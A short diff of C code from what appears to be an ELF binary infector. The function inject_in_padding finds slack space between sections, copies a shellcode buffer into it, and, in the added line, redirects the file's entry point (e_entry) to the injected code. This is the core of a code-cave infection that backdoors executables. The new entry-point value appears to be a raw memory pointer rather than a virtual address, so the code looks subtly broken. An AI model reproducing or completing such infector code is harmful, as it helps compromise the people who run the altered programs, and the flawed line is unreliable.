@@ -366,16 +366,17 @@ void	inject_in_padding(void *map)
 		if (shdr[i+1].sh_offset - (shdr[i].sh_offset + shdr[i].sh_size)\
 				>= sizeof(shellcode))
 			{
-				printf("Section [%2d]: %-16s offset: 0x%06lx size: %06d available space: %lu \n",
+				printf("Section [%2d]: %-16s address:0x%010lx offset: 0x%06lx size: %06d available space: %lu \n",
 					i, 
 					name,
+					map + shdr[i].sh_offset + shdr[i].sh_size,
 					shdr[i].sh_offset,
 					shdr[i].sh_size, 
 					shdr[i+1].sh_offset - (shdr[i].sh_offset + \
 						shdr[i].sh_size));
 				memcpy(map + shdr[i].sh_offset + shdr[i].sh_size, shellcode, sizeof(shellcode));
-				// ehdr->e_entry = 
-				break;gi
+				ehdr->e_entry = map + shdr[i].sh_offset + shdr[i].sh_size;
+				break;
 			}
 		else
 		{
